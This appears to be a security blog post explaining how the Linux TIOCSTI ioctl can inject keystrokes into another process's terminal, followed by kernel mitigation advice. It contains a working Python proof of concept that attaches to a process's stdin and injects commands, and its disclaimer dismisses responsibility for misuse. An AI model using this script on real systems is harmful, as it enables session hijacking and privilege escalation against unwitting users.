**_Disclaimer:_** _You are free to use presented knowledge for educational purposes, with good intentions (penetration testing, ctf’s etc.), or not._ **_I am not responsible for anything you do._**

---

I wrote this article back in 2021, and it was available on my old website. Since 2022, there's a mitigation available, so I've decided to bring the article back and update it.

---

## The TIOCSTI interface abuse

### **Prerequisite:** root

> (Not always! This is a potential privilege escalation and lateral movement vector.)

Imagine that you could take control over processes' stdin. For example inject commands into someones shell, giving impression, that the shell has been took control over and is executing commands by itself.

How does one manage to affect the file descriptors of a process in such unsafe way?

[Dangerous interface - TIOCSTI.](https://undeadly.org/cgi?action=article;sid=20170701132619) 

A common use of this interface, is to control hardware devices. But it can be also used to inject commands into unsuspecting TTY's, even connected to other devices for example over SSH.

Proof of Concept: 

```python
import sys, os 
import termios, fcntl 

# specify tty
process = sys.argv[1]

# Open the process input file descriptor
fd = "/proc/" + process + "/fd/0" 
fd_handle = os.open(fd, os.O_RDWR) 

while True: 
  line = input(f"{fd} $ ") 
  for character in line: 
     fcntl.ioctl(fd_handle, termios.TIOCSTI, character)
  fcntl.ioctl(fd_handle, termios.TIOCSTI, '\x0d')
```

In the example above we are attaching to the process stdin, sending chars one by one, and then executing the command by sending the **'\x0d'** shell escape char.

### What is the result?

![Proof of Concept](images/poc.gif)

 > In summary, it is possible to transparently take control over a program descriptor using TIOCSTI.

## Mitigation

TIOCSTI is a kernel problem.
https://jdebp.uk/FGA/TIOCSTI-is-a-kernel-problem.html

If you use BSD, you are safe, as this interface has been removed completely.
In case you use Linux, it is enabled by default, however, it is possible to disable it since 2022, Kernel version 6.2.

https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=83efeeeb3d04b22aaed1df99bc70a48fe9d22c4d

Recompile your kernel with this setting as below:

```
CONFIG_LEGACY_TIOCSTI=n
```


Disabling this interface may result in programs relying on TIOCSTI to break.

If you wan't to continue using TIOCSTI, make sure to test if only privileged users are able to use it, and there are no vulnerable apps there to abuse it, **to prevent privilege escalation scenarios.**

Example privilege escalation:
https://vuldb.com/?id.223097

Stay safe!

K.